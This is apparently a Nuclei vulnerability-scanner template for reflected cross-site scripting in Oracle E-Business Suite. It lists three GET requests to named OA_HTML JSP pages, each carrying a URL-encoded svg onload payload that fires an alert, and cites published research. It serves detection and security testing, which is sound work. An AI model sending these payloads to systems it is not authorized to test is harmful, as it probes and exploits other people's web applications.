# Nuclei Template: Oracle E-Business Suite - Cross-Site Scripting
**Template ID:** oracle-ebs-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`oracle-ebs-xss.yaml`)

## Vulnerability Information & PoC

## Description
Oracle E-Business Suite is vulnerable to Cross Site Scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
GET {{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
GET {{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
```

## References
- https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
- http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
